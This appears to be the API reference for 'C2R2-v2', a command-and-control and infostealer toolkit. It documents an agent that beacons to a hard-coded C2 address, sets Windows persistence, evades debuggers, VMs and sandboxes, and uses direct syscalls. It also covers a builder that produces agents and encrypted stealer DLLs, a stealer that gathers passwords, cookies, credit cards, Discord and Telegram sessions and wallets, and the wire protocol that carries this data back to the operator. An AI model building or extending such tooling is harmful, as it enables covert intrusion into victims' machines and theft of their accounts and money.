# API Reference

This document provides API reference for C2R2-v2 components and interfaces.

## Agent API

### Configuration

#### `config.rs`

```rust
/// C2 server address and port
pub const C2_SERVER: &str = "192.168.1.10:4444";
```

Configuration constants for the agent. Modified at build time by the builder tool.

### Beacon Module

#### `beacon.rs`

##### BeaconConfig

```rust
pub struct BeaconConfig {
    /// Check-in interval in seconds
    pub interval: u64,
    
    /// Jitter percentage (0-100)
    pub jitter_percent: u64,
}
```

Configuration for beacon timing.

**Default Values**:
- `interval`: 60 seconds
- `jitter_percent`: 30%

##### Functions

```rust
/// Calculate sleep duration with jitter
pub fn calculate_sleep_duration(config: &BeaconConfig) -> Duration
```

Calculates randomized sleep duration based on interval and jitter.

**Parameters**:
- `config`: Beacon configuration

**Returns**: Duration to sleep before next check-in

**Example**:
```rust
let config = BeaconConfig { interval: 60, jitter_percent: 30 };
let sleep_time = calculate_sleep_duration(&config);
// Returns duration between 42-78 seconds
```

---

```rust
/// Calculate retry interval with exponential backoff
pub fn calculate_retry_interval(config: &BeaconConfig, retry_count: u32) -> Duration
```

Calculates retry interval using exponential backoff.

**Parameters**:
- `config`: Beacon configuration
- `retry_count`: Number of consecutive failures

**Returns**: Duration to wait before retry

**Algorithm**: `min(base_interval * 2^retry_count, 300 seconds)`

---

```rust
/// Sleep with jitter
pub fn beacon_sleep(duration: Duration)
```

Sleep for the specified duration.

**Parameters**:
- `duration`: Time to sleep

### Persistence Module

#### `persistence.rs`

##### Functions

```rust
/// Establish persistence using specified method
pub fn establish_persistence(method: &str) -> Result<String, String>
```

Creates persistence mechanism on the target system.

**Parameters**:
- `method`: Persistence method ("registry" | "task" | "wmi" | "startup")

**Returns**: 
- `Ok(String)`: Success message with details
- `Err(String)`: Error message

**Methods**:

1. **Registry** - Add to Run key
   ```rust
   // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   ```

2. **Task** - Create scheduled task
   ```rust
   // Trigger: User logon
   // Action: Execute agent
   ```

3. **WMI** - WMI event subscription
   ```rust
   // Event: User logon
   // Consumer: Execute agent
   ```

4. **Startup** - Copy to startup folder
   ```rust
   // %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
   ```

---

```rust
/// Remove all persistence mechanisms
pub fn remove_persistence() -> Result<String, String>
```

Removes all persistence mechanisms created by the agent.

**Returns**:
- `Ok(String)`: Success message
- `Err(String)`: Error message

### Evasion Module

#### `evasion.rs`

##### Functions

```rust
/// Check if debugger is attached
pub fn is_debugger_present() -> bool
```

Detects if a debugger is attached to the process.

**Returns**: `true` if debugger detected

---

```rust
/// Check if running in a virtual machine
pub fn is_virtual_machine() -> bool
```

Detects if running in a VM environment.

**Returns**: `true` if VM detected

**Detection Methods**:
- VM-specific processes
- VM-specific files
- VM-specific registry keys
- Hardware characteristics

---

```rust
/// Check if running in a sandbox
pub fn is_sandbox() -> bool
```

Detects if running in a sandbox environment.

**Returns**: `true` if sandbox detected

**Detection Methods**:
- Limited file system
- Unusual system time
- Insufficient CPU cores
- Low disk space

### Syscalls Module

#### `syscalls.rs`

##### Functions

```rust
/// Allocate memory using direct syscall
pub fn nt_allocate_virtual_memory(
    size: usize,
    protection: u32
) -> Result<*mut u8, Error>
```

Allocates memory using `NtAllocateVirtualMemory` syscall.

**Parameters**:
- `size`: Size in bytes
- `protection`: Memory protection flags

**Returns**: Pointer to allocated memory

---

```rust
/// Write to memory using direct syscall
pub fn nt_write_virtual_memory(
    address: *mut u8,
    data: &[u8]
) -> Result<(), Error>
```

Writes data to memory using `NtWriteVirtualMemory` syscall.

**Parameters**:
- `address`: Target address
- `data`: Data to write

**Returns**: `Ok(())` on success

## Server API

### Client Management

```rust
pub struct ClientInfo {
    pub id: ClientId,
    pub stream: TcpStream,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub privileges: String,
    pub connected_at: DateTime<Local>,
}
```

Information about a connected agent.

### Commands

The server accepts commands through an interactive CLI:

| Command | Format | Description |
|---------|--------|-------------|
| `/list` | `/list` | List all connected clients |
| `/select` | `/select <id>` | Select client by ID |
| `/deselect` | `/deselect` | Deselect current client |
| `/info` | `/info <id>` | Show client information |
| `/cmd` | `/cmd <command>` | Execute command on selected client |
| `/cmd_all` | `/cmd_all <command>` | Execute command on all clients |
| `/download` | `/download <path>` | Download file from agent |
| `/upload` | `/upload <local> <remote>` | Upload file to agent |
| `/harvest` | `/harvest` | Execute stealer module |
| `/persist` | `/persist <method>` | Establish persistence |
| `/persist_remove` | `/persist_remove` | Remove persistence |
| `/beacon` | `/beacon <int>:<jit>` | Configure beacon |
| `/help` | `/help` | Show help |
| `/exit` | `/exit` or `/quit` | Shutdown server |

## Builder API

### Command Line Interface

```bash
c2r2-builder [COMMAND] [OPTIONS]
```

#### Commands

##### `build-agent`

Build a configured agent executable.

**Usage**:
```bash
c2r2-builder build-agent --name <NAME> --server <SERVER>
```

**Options**:
- `--name <NAME>`: Agent name (used for output filename)
- `--server <SERVER>`: C2 server address (format: `host:port`)

**Example**:
```bash
c2r2-builder build-agent --name agent1 --server 192.168.1.10:4444
```

**Output**: `output/agent1.exe`

##### `encrypt-module`

Encrypt a DLL module for secure deployment.

**Usage**:
```bash
c2r2-builder encrypt-module [OPTIONS]
```

**Options**:
- `--input <PATH>`: Input DLL path (default: auto-detect stealer.dll)
- `--output <PATH>`: Output encrypted module path (default: c2r2-server/modules/)

**Example**:
```bash
c2r2-builder encrypt-module --input ../target/release/stealer.dll
```

**Output**: 
- `c2r2-server/modules/stealer.enc` - Encrypted module
- `c2r2-server/modules/stealer.key` - Encryption key

### Encryption Functions

```rust
pub fn encrypt_module(module_bytes: &[u8]) -> Result<(Vec<u8>, Vec<u8>), EncryptionError>
```

Encrypts a module using AES-256-GCM.

**Parameters**:
- `module_bytes`: Raw module data

**Returns**: 
- `Ok((ciphertext, key))`: Encrypted data and key
- `Err(EncryptionError)`: Encryption failed

**Algorithm**:
- Encryption: AES-256-GCM
- Key size: 256 bits (32 bytes)
- Nonce size: 96 bits (12 bytes)
- Random key generation using OS CSPRNG

## Module API

### Module Interface

All modules must implement these C-compatible functions:

#### `module_init`

```c
int module_init(void)
```

Initialize the module. Called when module is loaded.

**Returns**:
- `0`: Success
- Non-zero: Error code

#### `module_execute`

```c
char* module_execute(void)
```

Execute the module's main functionality.

**Returns**: Pointer to C string with results (must be freed with `free_string`)

#### `free_string`

```c
void free_string(char* s)
```

Free a string returned by `module_execute`.

**Parameters**:
- `s`: String pointer to free

#### `DllMain` (Windows only)

```c
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
```

Standard Windows DLL entry point.

**Parameters**:
- `hinstDLL`: DLL instance handle
- `fdwReason`: Reason for calling (DLL_PROCESS_ATTACH, etc.)
- `lpvReserved`: Reserved

**Returns**: `TRUE` for success

### Stealer Module API

#### Exported Functions

##### `steal_credentials`

```c
char* steal_credentials(void)
```

Steal credentials from all supported sources.

**Returns**: JSON string with stolen data

**Format**:
```json
{
  "passwords": [...],
  "cookies": [...],
  "autofill": [...],
  "credit_cards": [...],
  "discord_tokens": [...],
  "telegram_sessions": [...],
  "wallets": [...]
}
```

##### `free_credentials_string`

```c
void free_credentials_string(char* s)
```

Free string returned by `steal_credentials`.

##### `get_version`

```c
char* get_version(void)
```

Get module version string.

**Returns**: Version string (e.g., "stealer-dll v2.0.0")

### Stealer Types

#### Credential

```rust
pub struct Credential {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String,
}
```

A single stolen credential.

#### StolenData

```rust
pub struct StolenData {
    pub credentials: Vec<Credential>,
    pub discord_tokens: Vec<DiscordToken>,
    pub wallets: Vec<WalletData>,
    pub gaming: Vec<GamingData>,
    pub telegram: Vec<TelegramSession>,
    pub credit_cards: Vec<CreditCard>,
    pub addresses: Vec<AutofillAddress>,
}
```

Collection of all stolen data.

**Methods**:

```rust
impl StolenData {
    /// Create new empty StolenData
    pub fn new() -> Self
    
    /// Check if no data was stolen
    pub fn is_empty(&self) -> bool
    
    /// Count total items
    pub fn total_count(&self) -> usize
    
    /// Convert to formatted string
    pub fn to_string(&self) -> String
}
```

## Protocol Specification

### Communication Protocol

C2R2-v2 uses a simple text-based protocol over TCP.

#### Message Format

```
<MESSAGE>\n<<END>>\n
```

- Messages are newline-terminated
- End-of-message marker: `\n<<END>>\n`
- Multiple messages can be sent in sequence

#### Command Messages (Server → Agent)

Format: `__COMMAND__:parameters\n`

**Examples**:

```
# Execute command
__CMD__:whoami\n

# Download file
__DOWNLOAD__:C:\file.txt\n

# Upload file
__UPLOAD__|C:\destination.txt|<base64_data>\n

# Harvest credentials
__HARVEST__\n

# Persistence
__PERSIST__:registry\n

# Beacon configuration
__BEACON__:60:30\n
```

#### Response Messages (Agent → Server)

Format: `response_data\n<<END>>\n`

**Examples**:

```
# Command output
DESKTOP01\john
<<END>>

# File data
__FILE__:<base64_encoded_data>
<<END>>

# Error
ERROR:File not found
<<END>>
```

#### System Information (Agent → Server)

Sent automatically on connection:

```
__SYSINFO__:hostname|username|os|privileges
<<END>>
```

**Example**:
```
__SYSINFO__:DESKTOP01|john|Windows 10 Pro (19045)|User
<<END>>
```

## Error Codes

### Agent Errors

| Code | Description |
|------|-------------|
| `ERROR:Connection failed` | Cannot connect to C2 server |
| `ERROR:Command execution failed` | Command execution error |
| `ERROR:File not found` | Requested file doesn't exist |
| `ERROR:Access denied` | Insufficient privileges |
| `ERROR:Module load failed` | Cannot load module |
| `ERROR:Decryption failed` | Module decryption error |

### Server Errors

| Code | Description |
|------|-------------|
| `No client selected` | Command requires selected client |
| `Client not found` | Invalid client ID |
| `File read error` | Cannot read local file |
| `Upload failed` | File upload error |
| `Module not found` | Requested module doesn't exist |

## Type Definitions

### Common Types

```rust
/// Client identifier
pub type ClientId = u32;

/// Result type for agent operations
pub type AgentResult<T> = Result<T, AgentError>;

/// Result type for server operations
pub type ServerResult<T> = Result<T, ServerError>;

/// Result type for stealer operations
pub type StealerResult<T> = Result<T, StealerError>;
```

### Error Types

```rust
pub enum AgentError {
    ConnectionFailed(std::io::Error),
    CommandFailed(String),
    FileNotFound,
    AccessDenied,
    ModuleLoadError,
    DecryptionError,
}

pub enum ServerError {
    ClientNotFound(ClientId),
    NoClientSelected,
    FileReadError(std::io::Error),
    UploadFailed(String),
    ModuleNotFound(String),
}

pub enum StealerError {
    BrowserNotFound,
    DecryptionFailed,
    DatabaseError(String),
    IoError(String),
    Base64Error,
    InvalidData,
}
```

## Constants

### Agent Constants

```rust
/// Message delimiter
pub const DELIMITER: &str = "\n<<END>>\n";

/// Default beacon interval (seconds)
pub const DEFAULT_BEACON_INTERVAL: u64 = 60;

/// Default jitter percentage
pub const DEFAULT_JITTER_PERCENT: u64 = 30;

/// Maximum retry backoff (seconds)
pub const MAX_RETRY_BACKOFF: u64 = 300;
```

### Server Constants

```rust
/// Default listen address
pub const DEFAULT_LISTEN_ADDR: &str = "0.0.0.0:4444";

/// Downloads directory
pub const DOWNLOADS_DIR: &str = "downloads";

/// Harvests directory
pub const HARVESTS_DIR: &str = "harvests";

/// Modules directory
pub const MODULES_DIR: &str = "modules";

/// Logs directory
pub const LOGS_DIR: &str = "logs";
```

## Examples

### Creating a Custom Module

```rust
// my_scanner/src/lib.rs
#![allow(non_snake_case)]

use std::os::raw::c_char;
use std::ffi::CString;

#[no_mangle]
pub extern "C" fn module_init() -> i32 {
    0  // Success
}

#[no_mangle]
pub extern "C" fn module_execute() -> *mut c_char {
    let results = scan_network();
    let output = format!("Found {} hosts:\n{}", results.len(), 
                        results.join("\n"));
    CString::new(output).unwrap().into_raw()
}

#[no_mangle]
pub extern "C" fn free_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}

fn scan_network() -> Vec<String> {
    // Implementation
    vec!["192.168.1.1".to_string(), "192.168.1.2".to_string()]
}

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _: *mut std::ffi::c_void,
    _: u32,
    _: *mut std::ffi::c_void,
) -> i32 {
    1
}
```

### Using the Agent API

```rust
use c2r2_agent::{beacon, persistence};

fn main() {
    // Configure beacon
    let config = beacon::BeaconConfig {
        interval: 120,
        jitter_percent: 40,
    };
    
    // Establish persistence
    if let Ok(msg) = persistence::establish_persistence("registry") {
        println!("Persistence: {}", msg);
    }
}
```

---

For more examples and detailed usage, see [DEVELOPMENT.md](DEVELOPMENT.md) and [USAGE.md](USAGE.md).
